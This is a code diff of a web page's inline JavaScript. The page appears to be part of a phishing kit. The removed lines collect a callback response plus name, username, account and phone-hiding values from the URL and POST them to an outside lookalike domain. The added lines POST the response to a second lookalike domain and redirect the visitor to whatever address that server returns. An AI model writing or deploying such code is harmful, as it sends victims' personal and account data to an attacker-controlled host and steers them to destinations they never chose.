@@ -60,49 +60,13 @@
     <script type="text/javascript">
       function onSuccess(response){
         var kodi = response;
-        const urlParams = new URLSearchParams(window.location.search);
-
-        const data = [];
-
-        data.push({ name: 'response', value: kodi });
-
-        if (urlParams.has('teksti')) {
-          const teksti = urlParams.get('teksti');
-          data.push({ name: 'teksti', value: teksti });
-        }
-
-        if (urlParams.has('image')) {
-          const image = urlParams.get('image');
-          data.push({ name: 'image', value: image });
-        }
-
-        if (urlParams.has('name')) {
-          const name = urlParams.get('name');
-          data.push({ name: 'name', value: name });
-        }
-
-        if (urlParams.has('username')) {
-          const username = urlParams.get('username');
-          data.push({ name: 'username', value: username });
-        }
-
-        if (urlParams.has('hidephone')) {
-          const hidephone = urlParams.get('hidephone');
-          data.push({ name: 'hidephone', value: hidephone });
-        }
-
-        if (urlParams.has('account')) {
-          const account = urlParams.get('account');
-          data.push({ name: 'account', value: account });
-        }
-
         $.ajax({
             type: "POST",
-            url: "https://notifyserver-me.info/send/serversfulle.php",
-            data: data,
+            url: "https://notifymyusers.info/send/serversfirebasee.php",
+            data: { response: kodi },
             success: function(response)
             {
-              location.href = response;
+                location.href = response;
            }
        });
       }
